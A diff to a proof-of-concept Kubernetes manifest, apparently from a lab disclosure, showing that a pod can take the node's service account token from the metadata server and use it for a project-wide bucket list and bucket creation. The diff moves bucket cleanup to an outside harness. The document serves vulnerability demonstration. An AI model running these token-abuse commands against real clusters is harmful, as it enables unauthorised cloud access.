@@ -1,11 +1,16 @@
 # Shows how far a manifest from this repository reaches: it schedules a pod, the pod asks
 # the node's metadata server for the node service account, and uses it for TWO calls at the
-# scope of the whole project - one read, and one write that undoes itself immediately.
+# scope of the whole project - one READ and one WRITE.
 #
 # The token itself is never printed and never leaves the cluster. Only HTTP status lines are
-# printed. The write creates a bucket with a random name and deletes it in the next command,
-# which is the smallest action that distinguishes "this identity holds roles/editor" from
-# "this identity can read".
+# printed. The write creates a bucket with a random name and prints that name on its own
+# line, so the harness that runs this PoC removes it immediately afterwards using the
+# project owner's own credential - see poc-gkehub-configsync-full.js. The cleanup is done
+# there rather than here on purpose: this image is busybox, whose wget cannot issue DELETE,
+# and a proof of concept must not depend on that to avoid leaving a resource behind.
+#
+# The write is the smallest action that distinguishes "this identity holds roles/editor"
+# from "this identity can read".
 #
 # The project id below is the lab's own project. A node service account from any other
 # project is refused on it, so syncing this file elsewhere does nothing.
@@ -36,12 +41,10 @@ spec:
       echo "--- READ at project scope: storage buckets.list ---"
       wget -S -qO- --header="Authorization: Bearer $T" \
         "https://storage.googleapis.com/storage/v1/b?project=$P&fields=kind" 2>&1 | head -2
-      B=zz-nodesa-write-$(hostname)-$(date +%s)
-      echo "--- WRITE at project scope: storage buckets.insert $B ---"
+      B=zz-nodesa-write-$(date +%s)-$$
+      echo "--- WRITE at project scope: storage buckets.insert ---"
       wget -S -qO- --header="Authorization: Bearer $T" --header='Content-Type: application/json' \
         --post-data="{\"name\":\"$B\"}" \
         "https://storage.googleapis.com/storage/v1/b?project=$P" 2>&1 | head -2
-      echo "--- UNDO the write immediately: storage buckets.delete ---"
-      wget -S -qO- --method=DELETE --header="Authorization: Bearer $T" \
-        "https://storage.googleapis.com/storage/v1/b/$B" 2>&1 | head -2
+      echo "CREATED-BUCKET=$B"
       echo "--- DONE-NODESA ---"
